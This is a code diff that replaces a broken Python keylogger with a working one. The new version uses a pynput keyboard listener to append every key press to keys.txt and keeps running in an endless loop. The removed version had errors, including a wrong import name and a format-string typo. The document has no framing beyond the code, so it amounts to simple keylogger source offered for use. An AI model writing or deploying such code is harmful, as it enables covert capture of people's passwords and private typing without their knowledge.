@@ -1,17 +1,14 @@
+from pynput import keyboard
 
-from pynput.keyboard import key , Listener
-import logging
 
-log_dir = ''
+def handle_keys(key: keyboard.Key):
+    with open('keys.txt', 'a') as file_:
+        file_.write(str(key).strip("'"))
 
-with open("keylogs.txt", "w", encoding="utf-8") as f:
-    pass  # non scrive nulla, ma il file viene creato
 
-logging.basicConfig(filename=(log_dir + 'keylogs.txt'), \
-                    level=logging.DEBUG, format='%(asktime)s: %(message)s')
+if __name__ == '__main__':
+    listener = keyboard.Listener(on_press=handle_keys)
+    listener.start()
 
-def on_press():
-    logging.info(str(key))
-
-with Listener(on_press=on_press) as Listener:
-    Listener.join()
+    while True:
+        input()
